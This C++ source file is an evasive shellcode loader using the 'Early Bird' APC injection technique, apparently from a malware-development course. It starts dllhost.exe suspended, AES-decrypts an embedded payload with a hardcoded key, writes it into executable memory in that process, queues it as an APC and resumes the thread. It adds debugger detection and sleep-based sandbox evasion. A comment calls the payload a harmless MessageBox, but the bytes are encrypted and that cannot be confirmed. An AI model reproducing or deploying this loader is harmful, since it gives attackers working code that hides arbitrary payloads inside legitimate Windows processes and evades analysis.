#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <string>
//#include "ntbasic.h"


typedef BOOL (WINAPI* pfnWriteProcessMemory)(
    IN  HANDLE  hProcess,
    IN  LPVOID  lpBaseAddress,
    IN  LPCVOID lpBuffer,
    IN  SIZE_T  nSize,
    OUT SIZE_T* lpNumberOfBytesWritten
);

typedef LPVOID (WINAPI* pfnVirtualAllocEx)(
    IN           HANDLE hProcess,
    IN OPTIONAL  LPVOID lpAddress,
    IN           SIZE_T dwSize,
    IN           DWORD  flAllocationType,
    IN           DWORD  flProtect
);

typedef DWORD (WINAPI* pfnQueueUserAPC)(
    IN PAPCFUNC  pfnAPC,
    IN HANDLE    hThread,
    IN ULONG_PTR dwData
);

typedef BOOL (WINAPI* pfnCreateProcessW)(
    IN OPTIONAL       LPCWSTR               lpApplicationName,
    IN OUT OPTIONAL   LPWSTR                lpCommandLine,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN                BOOL                  bInheritHandles,
    IN                DWORD                 dwCreationFlags,
    IN OPTIONAL       LPVOID                lpEnvironment,
    IN OPTIONAL       LPCWSTR               lpCurrentDirectory,
    IN                LPSTARTUPINFOW        lpStartupInfo,
    OUT               LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI* pfnResumeThread)(
    IN HANDLE hThread
);

// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED
unsigned char shellcode[] = { 0x20, 0x4e, 0x11, 0xa5, 0x5c, 0x89, 0xd7, 0x6e, 0xc2, 0x74, 0x82, 0xa0, 0x83, 0xea, 0x86, 0x9e, 0x9e, 0x45, 0xfd, 0x3b, 0x16, 0x49, 0xbd, 0x22, 0xd8, 0xe3, 0x6d, 0x8e, 0x52, 0x6e, 0x1a, 0x27, 0x58, 0x4c, 0xeb, 0x45, 0x9b, 0xde, 0x5c, 0x9b, 0x3, 0x6d, 0x56, 0x24, 0x16, 0x6d, 0xd8, 0x93, 0x9, 0x4, 0x54, 0x96, 0xf2, 0x69, 0x29, 0xe3, 0x39, 0x4c, 0xd, 0xad, 0x4f, 0x5b, 0xe6, 0xb8, 0xf1, 0xd9, 0xd1, 0x73, 0xbc, 0x95, 0x23, 0x6d, 0xb7, 0x62, 0x98, 0x90, 0x4, 0x7, 0x2f, 0xe, 0xe7, 0xb, 0x3b, 0xbe, 0x81, 0x4e, 0x10, 0x1a, 0xbb, 0x23, 0x93, 0xbc, 0xb2, 0xe5, 0xfb, 0x4d, 0xfe, 0xfa, 0x18, 0x4f, 0x28, 0x2d, 0xaa, 0x94, 0x18, 0x14, 0x5c, 0x14, 0x5, 0x9b, 0x9d, 0x2, 0x1f, 0x84, 0x2, 0xdd, 0x21, 0xa7, 0x40, 0x0, 0x5d, 0x8d, 0x46, 0x79, 0x28, 0x15, 0x20, 0x61, 0x16, 0x2c, 0xfa, 0x45, 0xb, 0x5c, 0xf, 0x6, 0x2b, 0xf5, 0x40, 0x69, 0x4b, 0x8c, 0x32, 0x88, 0xa2, 0xcd, 0xfc, 0xcd, 0xaa, 0x46, 0x56, 0x67, 0x9b, 0x6f, 0x51, 0xde, 0x6f, 0xbe, 0xbb, 0x82, 0xdb, 0xf, 0x72, 0xb, 0xdc, 0xb2, 0xf5, 0xad, 0xc6, 0x73, 0x47, 0x29, 0x5, 0xa5, 0x19, 0x2e, 0x2a, 0xe3, 0x17, 0x2d, 0x19, 0xac, 0x34, 0x4a, 0x20, 0x4a, 0xe, 0x9f, 0x4c, 0x8f, 0xd5, 0x99, 0xee, 0x24, 0x72, 0x9f, 0x76, 0xc9, 0xa3, 0x4d, 0x89, 0xa0, 0x5b, 0x50, 0x58, 0xe5, 0x9, 0x47, 0xf4, 0x3b, 0x6c, 0xf1, 0xaf, 0xcc, 0x54, 0xe, 0xf7, 0x64, 0xd4, 0x44, 0x98, 0x87, 0x3d, 0xcd, 0x83, 0x3, 0x67, 0x9a, 0x1b, 0x83, 0x9f, 0x94, 0x1e, 0x1f, 0x3b, 0x4e, 0x48, 0xd4, 0x28, 0xa6, 0x48, 0x2f, 0x4e, 0x26, 0x93, 0xc2, 0x80, 0x39, 0xef, 0xcc, 0x32, 0x46, 0xf3, 0xd0, 0x71, 0xa, 0xd2, 0xa3, 0x86, 0x6e, 0xdf, 0x29, 0xf9, 0xd9, 0x1e, 0xf5, 0x46, 0x52, 0x77, 0xca, 0xf2, 0xe6, 0xd3, 0xe9, 0xd0, 0x4, 0x87, 0xa5, 0x7c, 0xbc, 0x12, 0xc6, 0x71, 0x75, 0x77, 0xcc, 0xbc, 0xef, 0x90, 0x66, 0x2, 0xd6, 0xdc, 0xe7, 0x31, 0xae, 0xb, 0xb9, 0x4d, 0x3e, 0x1e, 0x2d, 0xc9, 0x7d, 0x98, 0x64, 0xd3, 0x58, 0x4f, 0xc8, 0x68, 0xb2, 0x12, 0x9d, 0x2a, 0x25, 0xa1, 0x1d, 0xd, 0x30, 0x7e, 0x92, 0x74, 0xa4, 0x9d, 0xb6, 0x5a, 0x2a, 0x5e, 0x49, 0xe6, 0x85, 0x24, 0xee, 0x2e, 0x1a, 0xeb, 0x52, 0x9, 0x98, 0xda, 0x23, 0x61, 0x7a, 0x75, 0xbe, 0x86, 0x45, 0x5a, 0xf0, 0xbd, 0x86, 0xd0, 0xe5, 0x7, 0x36, 0x8c, 0xe6, 0xc7, 0xe3, 0x6, 0xb6, 0x50, 0xc9, 0x30, 0xb8, 0xe, 0x19, 0xf6, 0x5d, 0xcb, 0x4f, 0xb6, 0xa5, 0xee, 0x65, 0xe9, 0x89, 0x27, 0x94, 0x36, 0xb, 0x79, 0xe0, 0xff, 0x6e, 0x83, 0xfa, 0x3, 0xcc, 0x7a, 0x5e, 0x52, 0xb6, 0x58, 0xc, 0x1e, 0x14, 0xce, 0x61, 0x5, 0xca, 0xfc, 0xba, 0x6a, 0x11, 0x4e, 0xde, 0xe8, 0xe4, 0x1, 0x20, 0x25, 0x1c, 0x30, 0xa2, 0x35, 0x38, 0xe2, 0xee, 0x2b, 0xcd, 0x7f, 0xd2, 0x7d, 0xbe, 0xf4, 0xc3, 0x1b, 0x2d, 0x34, 0xef, 0x9d, 0x57, 0x51, 0x87, 0xe6, 0x4a, 0x3d, 0x8c, 0xed, 0xee, 0x4c, 0xfe, 0x68, 0x29, 0x34, 0x6d, 0x4c, 0x78, 0xa7, 0x29, 0x65, 0x24, 0x50, 0x58, 0x9, 0xe4, 0x12, 0x64, 0x70, 0x1c, 0x91, 0xc2, 0x29, 0x55, 0xab, 0x97, 0xd9, 0x43, 0xc7, 0x1c, 0xb8, 0xde, 0x2a, 0x7e, 0x29, 0x41, 0x24, 0x4f, 0x96, 0x9b, 0xd0, 0x94, 0x33, 0x86, 0x54, 0x80, 0x2e, 0x73, 0xf6, 0x20, 0x43, 0x73, 0xa9, 0x79, 0x40, 0xaf, 0x45, 0x32, 0xd2, 0xdb, 0x3f, 0x41, 0x4f, 0x44, 0xc8, 0xca, 0x41, 0x34, 0x94, 0xf5 };
unsigned char key[] = { 0xb3, 0x9b, 0x44, 0x36, 0x5d, 0x4e, 0xe6, 0xcf, 0x92, 0x3d, 0x6, 0xcb, 0xbe, 0x29, 0x79, 0xc6 };

SIZE_T scSize = sizeof(shellcode);

// RTO Mal Dev course
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (CryptAcquire == false) {
        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (CryptCreate == false) {
        //printf("CryptCreateHash Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    if (CryptHash == false) {
        //printf("CryptHashData Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    if (CryptDerive == false) {
        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
    if (Crypt_Decrypt == false) {
        //printf("CryptDecrypt Failed: %d\n", GetLastError());
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int EarlyBird(HANDLE pHandle, HANDLE hThread, unsigned char* shellcode, SIZE_T scSize, DWORD Pid) {

    // Define NT imports
    // ------------------------------------------------------------------------------------------------------------
    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
    if (pVirtualAllocEx == NULL) {
        printf("[-] VirtualAllocEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
        return -2;
    }
    printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);
    
    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
    if (pWriteProcessMemory == NULL) {
        printf("[-] WriteProcessMemory [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
        return -2;
    }
    printf("[*] WriteProcessMemory [KERNEL32] Address     ->      [ %p ]\n", pWriteProcessMemory);

    pfnQueueUserAPC pQueueUserAPC = (pfnQueueUserAPC)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "QueueUserAPC");
    if (pQueueUserAPC == NULL) {
        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pQueueUserAPC, GetLastError());
        return -2;
    }
    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pQueueUserAPC);

    pfnResumeThread pResumeThread = (pfnResumeThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "ResumeThread");
    if (pResumeThread == NULL) {
        printf("[-] ResumeThread [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pResumeThread, GetLastError());
        return -2;
    }
    printf("[*] ResumeThread [KERNEL32] Address       ->      [ %p ]\n", pResumeThread);

    // ------------------------------------------------------------------------------------------------------------

    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD pcNameLength = sizeof(pcName);

    LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (!memAlloc) {
        printf("[ERR] Memory Allocation Failed  [ %d ] \n", GetLastError());
        return -2;
    } printf("[INFO] Memory allocation pointer: %p\n", (LPVOID)memAlloc);

    if (IsDebuggerPresent() == TRUE) {
        return -3;
    }
    else {
        if (SetEnvironmentVariableA("TASKS", "C:\\Windows\\System32\\Tasks") == TRUE) {
            for (int i = 0; i < 5500; i++) {
                if (i == 5000) {
                    SleepEx(1000, FALSE);
                }
                SleepEx(10, FALSE);
            }

            if (!GetComputerNameA(pcName, &pcNameLength)) {
                return -3;
            }
            printf("[SUCCESS] Computer Name   ->   [ %s ]\n", pcName);
        }
    }

    AESDecrypt(shellcode, scSize, (char*)key, (size_t)sizeof(key));

    SIZE_T bytesWritten = 0;
    DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &bytesWritten);
    if (!wMem) {
        printf("[ERR] Write Memory Failed  [ %d ] \n", GetLastError());
        return -2;
    }

    if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
        Sleep(10000);
        pResumeThread(hThread);
    }
    return 0;
}



int main() {

    pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
    if (pCreateProcessW == NULL) {
        printf("[-] CreateProcessW [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pCreateProcessW, GetLastError());
        return -2;
    }
    printf("[*] CreateProcessW [KERNEL32] Address       ->      [ %p ]\n", pCreateProcessW);

    // ------------------------------------------------------------------------------------------------------------

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    // Clear out startup and process info structures
    RtlSecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlSecureZeroMemory(&pi, sizeof(pi));

    std::wstring pName = L"C:\\Windows\\System32\\dllhost.exe";

    HANDLE pHandle = NULL;
    HANDLE hThread = NULL;
    DWORD Pid = 0;

    BOOL cProcess = pCreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (cProcess == FALSE) {
        printf("[ERR] Process not created\n");
        return 0;
    }
    //printf("[SUCCESS] Process created \n");

    pHandle = pi.hProcess;
    hThread = pi.hThread;

    Pid = pi.dwProcessId;

    EarlyBird(pHandle, hThread, shellcode, scSize, Pid);
    CloseHandle(pHandle);

	return 0;
}
